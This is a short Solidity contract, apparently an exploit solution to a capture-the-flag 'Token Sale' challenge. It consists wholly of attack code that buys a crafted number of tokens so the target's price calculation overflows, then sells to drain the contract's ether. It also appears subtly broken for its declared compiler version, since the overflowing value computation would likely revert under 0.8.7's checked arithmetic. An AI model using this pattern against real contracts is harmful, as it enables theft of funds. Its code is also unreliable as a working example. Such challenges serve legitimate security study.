pragma solidity 0.8.7;

interface ITokenSaleChallenge {
    function isComplete() external view returns(bool);
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external payable;
}

contract TokenSaleChallengeHack {
    ITokenSaleChallenge public tokenSaleInstance;
    
    uint256 WEI_UNIT = 10**18;
    uint256 public numAttack = (type(uint256).max / WEI_UNIT)+1;
    uint256 public valueAttack = numAttack * 1 ether;

    constructor (address _tokenSaleInstance) public {
        tokenSaleInstance = ITokenSaleChallenge(_tokenSaleInstance);
    }

    function attack() public payable{
        tokenSaleInstance.buy{value: msg.value}(numAttack);
    }

    function sell() public payable {
        tokenSaleInstance.sell(1);
    }

    function isSuccess() public view returns(bool){
        return tokenSaleInstance.isComplete();
    }

    receive() external payable {}
}